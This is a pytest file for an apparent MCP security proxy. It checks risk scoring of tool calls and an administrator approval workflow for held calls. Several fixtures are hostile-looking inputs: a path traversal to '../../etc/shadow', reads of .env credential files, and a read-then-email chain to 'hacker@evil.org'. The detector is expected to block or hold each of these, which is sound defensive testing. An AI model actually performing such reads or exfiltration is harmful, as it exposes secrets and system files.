"""Focused automated tests for filesystem read evaluation and administrative approval workflows."""

import asyncio
from datetime import datetime, timezone
from pathlib import Path
import pytest

from mcpath.backend.persistence.database import (
    create_pending_approval,
    get_approvals,
    get_approval_by_id,
    update_approval_status,
)
from mcpath.config.settings import settings
from mcpath.graph.capability_graph import CapabilityGraph
from mcpath.pipeline.stage import PipelineContext
from mcpath.proxy.approval_manager import ApprovalManager
from mcpath.risk_engine.models import EnforcementDecision, RiskScores, SecurityEventRecord


@pytest.fixture
def test_graph() -> CapabilityGraph:
    """Fixture providing rebuilt capability graph with filesystem and email tools."""
    cg = CapabilityGraph()
    server_tools = {
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read the complete contents of a file from the file system.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}
            },
            {
                "name": "list_directory",
                "description": "Get a detailed listing of all files and directories in a specified path.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}, "required": ["path"]}
            },
            {
                "name": "write_file",
                "description": "Create a new file or completely overwrite an existing file with new content.",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}}
            }
        ],
        "email-server": [
            {
                "name": "send_email",
                "description": "Send an email message to a recipient.",
                "inputSchema": {"type": "object", "properties": {"to": {"type": "string"}, "body": {"type": "string"}}}
            }
        ]
    }
    cg.rebuild_for_all_servers(server_tools)
    return cg


def test_benign_readme_read_allowed(test_graph: CapabilityGraph):
    """Ordinary read of a README file in an authorized directory evaluates to LOW and ALLOW."""
    result = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/README.md"}
    )
    assert result.classification == "LOW"
    assert result.path_risk_score < 30.0
    assert result.is_critical_override is False
    assert result.path_risk_score == pytest.approx(19.17, abs=0.1)


def test_benign_directory_listing_allowed(test_graph: CapabilityGraph):
    """Listing an authorized project directory evaluates to LOW and ALLOW."""
    result = test_graph.evaluate_runtime_call(
        tool_name="list_directory",
        arguments={"path": "C:/projects/mcp-demos/filesystem"}
    )
    assert result.classification == "LOW"
    assert result.path_risk_score < 30.0
    assert result.path_risk_score == pytest.approx(10.0, abs=0.1)


def test_unauthorized_system_directory_blocked(test_graph: CapabilityGraph):
    """Attempting to access unauthorized system directories triggers HIGH risk and BLOCK."""
    result = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        arguments={"path": "C:/Windows/System32/drivers/etc/hosts"}
    )
    assert result.classification == "HIGH"
    assert result.path_risk_score >= 70.0
    assert "POLICY BLOCK" in result.explanation


def test_path_traversal_attempt_blocked(test_graph: CapabilityGraph):
    """Path traversal attempting to escape authorized roots triggers HIGH risk and BLOCK."""
    result = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        arguments={"path": "../../etc/shadow"}
    )
    assert result.classification == "HIGH"
    assert result.path_risk_score >= 70.0
    assert "traversal" in result.explanation.lower()


def test_credential_file_read_held_for_review(test_graph: CapabilityGraph):
    """Reading credential/secret files (e.g. .env, id_rsa) triggers MEDIUM risk and HOLD."""
    result = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/.env"}
    )
    assert result.classification == "MEDIUM"
    assert 30.0 <= result.path_risk_score < 70.0
    assert "credential" in result.explanation.lower()


def test_observed_read_then_exfiltration_blocked(test_graph: CapabilityGraph):
    """Multi-step observed chain: file read followed by external email is BLOCKED by Critical Path Override."""
    # Step 1: Read file is allowed in isolation
    p_read = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/README.md"}
    )
    assert p_read.classification == "LOW"

    # Step 2: Observed exfiltration sequence
    p_exfil = test_graph.evaluate_runtime_call(
        tool_name="send_email",
        call_history=["read_file", "send_email"],
        arguments={"to": "hacker@evil.org", "body": "stolen file data"}
    )
    assert p_exfil.classification == "HIGH"
    assert p_exfil.path_risk_score == 90.0
    assert p_exfil.is_critical_override is True


@pytest.mark.asyncio
async def test_approval_manager_approve_flow():
    """Verify approval manager registers held calls and resumes on approval."""
    mgr = ApprovalManager()
    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="write_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/output.txt", "content": "test"},
        event_record=SecurityEventRecord(
            event_id="test_evt_01",
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="write_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=55.0)
        )
    )

    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=5.0)
    assert approval_id.startswith("appr_")

    # Simulate background administrator approval
    async def admin_approve():
        await asyncio.sleep(0.1)
        await mgr.resolve_approval(approval_id, "APPROVED", resolver="admin_tester")

    asyncio.create_task(admin_approve())
    decision = await mgr.wait_for_decision(approval_id, timeout_seconds=3.0)
    assert decision == "APPROVED"


@pytest.mark.asyncio
async def test_approval_manager_reject_flow():
    """Verify approval manager rejects calls when denied by administrator."""
    mgr = ApprovalManager()
    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="write_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/output.txt", "content": "dangerous"},
        event_record=SecurityEventRecord(
            event_id="test_evt_02",
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="write_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=60.0)
        )
    )

    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=5.0)

    # Simulate administrator rejection
    async def admin_reject():
        await asyncio.sleep(0.1)
        await mgr.resolve_approval(approval_id, "REJECTED", resolver="soc_analyst")

    asyncio.create_task(admin_reject())
    decision = await mgr.wait_for_decision(approval_id, timeout_seconds=3.0)
    assert decision == "REJECTED"


@pytest.mark.asyncio
async def test_approval_manager_timeout_flow():
    """Verify approval manager defaults to TIMED_OUT when no decision is made within timeout."""
    mgr = ApprovalManager()
    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="write_file",
        arguments={"path": "test.txt", "content": "data"},
        event_record=SecurityEventRecord(
            event_id="test_evt_03",
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="write_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=50.0)
        )
    )

    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=0.5)
    decision = await mgr.wait_for_decision(approval_id, timeout_seconds=0.5)
    assert decision == "TIMED_OUT"


@pytest.mark.asyncio
async def test_approval_replay_protection():
    """Verify that an already resolved approval cannot be resolved again."""
    mgr = ApprovalManager()
    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="write_file",
        arguments={"path": "test.txt", "content": "data"},
        event_record=SecurityEventRecord(
            event_id="test_evt_04",
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="write_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=50.0)
        )
    )

    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=5.0)
    res1 = await mgr.resolve_approval(approval_id, "APPROVED", resolver="admin1")
    assert res1.get("status") == "APPROVED"
    assert res1.get("already_resolved") is False

    # Second attempt to approve/reject
    res2 = await mgr.resolve_approval(approval_id, "REJECTED", resolver="admin2")
    assert res2.get("already_resolved") is True
    assert res2.get("status") == "APPROVED"


def test_subsequent_benign_reads_in_call_history_are_allowed(test_graph: CapabilityGraph):
    """Calling list_directory after read_file must NOT be treated as an exfiltration chain and must score LOW (ALLOW)."""
    # 1. Initial read
    r1 = test_graph.evaluate_runtime_call(
        tool_name="read_file",
        call_history=["read_file"],
        arguments={"path": "C:/projects/mcp-demos/filesystem/README.md"}
    )
    assert r1.classification == "LOW"
    assert r1.path_risk_score < 30.0

    # 2. Subsequent list_directory with call history containing the prior read
    r2 = test_graph.evaluate_runtime_call(
        tool_name="list_directory",
        call_history=["read_file", "list_directory"],
        arguments={"path": "C:/projects/mcp-demos/filesystem"}
    )
    assert r2.classification == "LOW"
    assert r2.path_risk_score == 10.0
    assert "Authorized read within permitted directory" in r2.explanation

    # 3. Subsequent directory_tree after long history
    r3 = test_graph.evaluate_runtime_call(
        tool_name="directory_tree",
        call_history=["list_allowed_directories", "read_text_file", "search_files", "list_directory", "directory_tree"],
        arguments={"path": "C:/projects/mcp-demos/filesystem"}
    )
    assert r3.classification == "LOW"
    assert r3.path_risk_score == 10.0


@pytest.mark.asyncio
async def test_full_hold_api_approval_lifecycle():
    """Verify complete HOLD lifecycle: register_hold -> appears in pending -> approve via DB/API -> wait_for_decision resolves."""
    from mcpath.backend.persistence.database import (
        get_session_factory,
        get_approvals,
        get_approval_by_id,
        update_approval_status,
        persist_security_event,
    )
    mgr = ApprovalManager()
    evt_id = f"test_full_evt_{datetime.now(timezone.utc).timestamp()}"
    
    # 1. Persist the security event first so foreign key is valid
    sec_event_dict = {
        "event_id": evt_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "server_name": "filesystem",
        "tool_name": "read_file",
        "arguments": {"path": ".env"},
        "decision": "HOLD",
        "reason": "Sensitive file read requires review",
        "scores": {"capability_risk": 46.7}
    }
    await persist_security_event(sec_event_dict)

    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="read_file",
        arguments={"path": ".env"},
        event_record=SecurityEventRecord(
            event_id=evt_id,
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="read_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=46.7),
            reason="Sensitive file read requires review"
        )
    )

    # 2. Register hold
    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=10.0)

    # 3. Verify it is visible in pending approvals queue
    pending_list = await get_approvals(status="PENDING")
    matching = [a for a in pending_list if a["approval_id"] == approval_id]
    assert len(matching) == 1
    assert matching[0]["tool_name"] == "read_file"
    assert matching[0]["risk_score"] == 46.7
    assert matching[0]["status"] == "PENDING"

    # 4. Resolve approval via administrator action
    update_res = await update_approval_status(approval_id, "APPROVED", resolved_by="test_admin")
    assert update_res["status"] == "APPROVED"

    # 5. Wait for decision returns APPROVED
    res_status = await mgr.wait_for_decision(approval_id, timeout_seconds=2.0)
    assert res_status == "APPROVED"

    # 6. Verify it is no longer pending
    pending_after = await get_approvals(status="PENDING")
    assert not any(a["approval_id"] == approval_id for a in pending_after)


@pytest.mark.asyncio
async def test_hold_immediately_appears_in_api_and_dashboard_client():
    """Verify HOLD request immediately appears in the approval API and dashboard client."""
    from frontend.streamlit_app.api_client import client
    mgr = ApprovalManager()
    evt_id = f"test_imm_evt_{datetime.now(timezone.utc).timestamp()}"

    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="read_file",
        arguments={"path": "C:/projects/mcp-demos/filesystem/.env", "api_key": "supersecret123"},
        event_record=SecurityEventRecord(
            event_id=evt_id,
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="read_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=46.67),
            reason="Sensitive file access requires review"
        )
    )

    approval_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=15.0)
    
    # Query via DB
    pending = await get_approvals(status="PENDING")
    appr = next((a for a in pending if a["approval_id"] == approval_id), None)
    assert appr is not None, "Pending approval must immediately appear"
    assert appr["server_name"] == "filesystem"
    assert appr["tool_name"] == "read_file"
    assert appr["risk_score"] == 46.67
    assert appr["arguments"].get("api_key") == "******", "Sensitive argument must be masked"

    # Clean up
    await update_approval_status(approval_id, "REJECTED", resolved_by="test_cleanup")


@pytest.mark.asyncio
async def test_multiple_pending_requests_independent_resolution():
    """Verify multiple pending requests are displayed and resolved independently without cross-talk."""
    mgr = ApprovalManager()

    # Create 3 distinct pending requests
    created = []
    for i, tool in enumerate(["read_file", "write_file", "edit_file"]):
        evt_id = f"test_multi_evt_{i}_{datetime.now(timezone.utc).timestamp()}"
        ctx = PipelineContext(
            server_name="filesystem",
            tool_name=tool,
            arguments={"path": f"file_{i}.txt"},
            event_record=SecurityEventRecord(
                event_id=evt_id,
                timestamp=datetime.now(timezone.utc).isoformat(),
                server_name="filesystem",
                tool_name=tool,
                decision=EnforcementDecision.HOLD,
                scores=RiskScores(capability_risk=40.0 + i * 5),
                reason=f"Hold test {i}"
            )
        )
        appr_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=10.0)
        created.append(appr_id)

    # Verify all 3 appear in pending queue
    pending = await get_approvals(status="PENDING")
    pending_ids = [p["approval_id"] for p in pending]
    for c_id in created:
        assert c_id in pending_ids

    # Resolve #0 as APPROVED
    res0 = await mgr.resolve_approval(created[0], "APPROVED", resolver="admin_a")
    assert res0["status"] == "APPROVED"

    # Resolve #1 as REJECTED
    res1 = await mgr.resolve_approval(created[1], "REJECTED", resolver="admin_b")
    assert res1["status"] == "REJECTED"

    # Verify #2 remains PENDING
    rec2 = await get_approval_by_id(created[2])
    assert rec2["status"] == "PENDING"

    # Verify #0 and #1 reflect their distinct statuses
    rec0 = await get_approval_by_id(created[0])
    assert rec0["status"] == "APPROVED"
    assert rec0["resolved_by"] == "admin_a"

    rec1 = await get_approval_by_id(created[1])
    assert rec1["status"] == "REJECTED"
    assert rec1["resolved_by"] == "admin_b"

    # Clean up #2
    await mgr.resolve_approval(created[2], "REJECTED", resolver="admin_cleanup")


@pytest.mark.asyncio
async def test_auto_timeout_marks_expired_approvals():
    """Verify that get_approvals automatically marks requests exceeding timeout as TIMED_OUT."""
    mgr = ApprovalManager()
    evt_id = f"test_timeout_auto_{datetime.now(timezone.utc).timestamp()}"

    ctx = PipelineContext(
        server_name="filesystem",
        tool_name="read_file",
        arguments={"path": "test.txt"},
        event_record=SecurityEventRecord(
            event_id=evt_id,
            timestamp=datetime.now(timezone.utc).isoformat(),
            server_name="filesystem",
            tool_name="read_file",
            decision=EnforcementDecision.HOLD,
            scores=RiskScores(capability_risk=50.0),
            reason="Auto timeout test"
        )
    )

    # Register with short timeout
    appr_id, _ = await mgr.register_hold(ctx, ctx.event_record, timeout_seconds=0.1)

    # Manually backdate created_at in DB by 35 seconds to simulate expiration
    from mcpath.backend.persistence.database import get_engine, PendingApprovalDB
    from sqlalchemy import update
    from datetime import timedelta
    async with get_engine().begin() as conn:
        past_time = datetime.now(timezone.utc) - timedelta(seconds=40)
        await conn.execute(
            update(PendingApprovalDB)
            .where(PendingApprovalDB.approval_id == appr_id)
            .values(created_at=past_time)
        )

    # Query get_approvals which triggers auto-timeout logic
    approvals_list = await get_approvals(limit=100)
    appr = next((a for a in approvals_list if a["approval_id"] == appr_id), None)
    assert appr is not None
    assert appr["status"] == "TIMED_OUT", "Expired pending approval must transition to TIMED_OUT"
    assert appr["resolved_by"] == "system:timeout"


